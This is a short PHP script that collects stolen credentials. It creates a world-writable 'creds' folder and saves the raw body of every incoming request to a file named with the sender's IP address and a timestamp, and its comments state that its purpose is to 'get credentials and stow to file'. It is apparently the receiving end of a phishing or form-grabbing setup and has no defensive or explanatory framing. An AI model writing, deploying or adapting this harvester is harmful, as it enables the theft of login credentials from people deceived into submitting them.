<?php
// check for existance of ./creds dir, make if not and set perms open
$cdir = getcwd() . "/creds/";
if (!file_exists($cdir)) {mkdir($cdir, 0777, true);}
// get credentials and stow to file
$file = $cdir . $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
file_put_contents($file, file_get_contents("php://input"));
?>